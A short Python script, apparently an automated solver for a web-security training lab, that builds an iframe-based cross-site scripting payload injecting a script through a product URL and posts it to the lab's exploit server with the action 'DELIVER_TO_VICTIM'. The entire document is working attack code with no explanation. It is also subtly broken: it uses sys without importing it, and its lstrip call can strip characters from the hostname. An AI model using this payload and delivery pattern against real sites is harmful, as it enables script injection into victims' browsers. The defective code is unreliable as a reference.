import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}'

s = requests.Session()

site_url = f'https://{site}/'
resp = s.get(site_url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')
exploit_html = f'''<iframe src="{url}/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src={url};window.x=1;">
'''
formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}
# First Stored the data and then delivered exploit to the victim
resp = s.post(exploit_url, data=formData)
print(resp)
